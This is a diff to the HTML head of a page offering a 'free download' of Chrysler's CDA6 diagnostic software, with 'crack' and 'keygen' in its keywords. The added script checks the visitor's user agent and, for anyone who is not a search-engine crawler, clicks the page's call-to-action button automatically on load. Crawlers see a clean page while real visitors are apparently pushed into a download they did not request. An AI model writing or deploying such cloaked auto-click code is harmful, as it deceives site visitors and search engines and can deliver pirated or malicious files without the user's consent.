@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chrysler Diagnostic Application (CDA6) 6.15.188</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Chrysler Diagnostic Application (CDA6) 6.15.188 supports MicroPod 2 for Dodge, Chrysler, and Jeep diagnostics including fault codes, live data, and module programming.">
     <meta name="keywords" content="Chrysler Diagnostic Application, CDA6 6.15.188, Chrysler diagnostic software, WiTech diagnostic system, automotive diagnostic tool, fault code reader, live data diagnostics, actuator tests, module programming, Chrysler diagnostic functions, secure wireless diagnostics, hardware performance enhancement, software performance enhancement, CDA6 software features, Chrysler Group diagnostics, free download, free installer, free download installer, Chrysler Diagnostic Application CDA6, Chrysler Diagnostic Application CDA6 download, Chrysler Diagnostic Application CDA6 free download, Chrysler Diagnostic Application CDA6 crack, Chrysler Diagnostic Application CDA6 keygen, CDA6 Chrysler diagnostic software, CDA6 diagnostic software download, CDA6 diagnostic software free download, Chrysler diagnostic software 6.15.188, CDA6 6.15.188 download, CDA6 6.15.188 free download, Chrysler diagnostic software 2023, CDA6 diagnostic app, CDA6 diagnostic app free download, Chrysler diagnostic tool, CDA6 MicroPod 2 support, Chrysler diagnostic system WiTech, Chrysler diagnostic application free download">
     <style>
